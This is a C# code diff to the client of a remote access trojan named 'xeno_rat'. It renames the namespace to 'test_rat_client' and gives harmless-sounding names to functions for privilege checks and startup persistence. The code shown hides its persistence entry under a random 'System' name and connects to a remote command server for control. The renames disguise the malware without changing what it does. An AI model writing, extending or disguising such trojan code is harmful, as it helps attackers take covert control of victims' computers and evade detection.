@@ -10,7 +10,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Security.Cryptography;
 
-namespace xeno_rat_client
+namespace test_rat_client
 {
     class Program
     {
@@ -48,7 +48,7 @@ namespace xeno_rat_client
             Console.SetOut(ConsoleCapture);
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
 
-            string currentMutex = serviceIdentifier + (Utils.IsAdmin() ? "-admin" : "");
+            string currentMutex = serviceIdentifier + (Utils.IsElevated() ? "-admin" : "");
             using (Mutex mutex = new Mutex(true, currentMutex, out bool createdNew))
             {
                 if (!createdNew) Environment.Exit(0);
@@ -101,13 +101,13 @@ namespace xeno_rat_client
             {
                 startup_name = "System" + GetRandomString(8);
             }
-            if (Utils.IsAdmin())
+            if (Utils.IsElevated())
             {
-                await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                await Utils.RegisterServiceAdmin(Assembly.GetEntryAssembly().Location, startup_name);
             }
             else
             {
-                await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                await Utils.RegisterServiceNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
             }
         }
 
@@ -122,7 +122,7 @@ namespace xeno_rat_client
                         await socket.ConnectAsync(ServerIp, ServerPort);
                         Server = await Utils.ConnectAndSetupAsync(socket, securityKey, 0, 0, HandleServiceStop);
                         Handler handle = new Handler(Server, ModuleManager);
-                        await handle.Type0Receive();
+                        await handle.HandleMainConnection();
                     }
                 }
                 catch (Exception e)
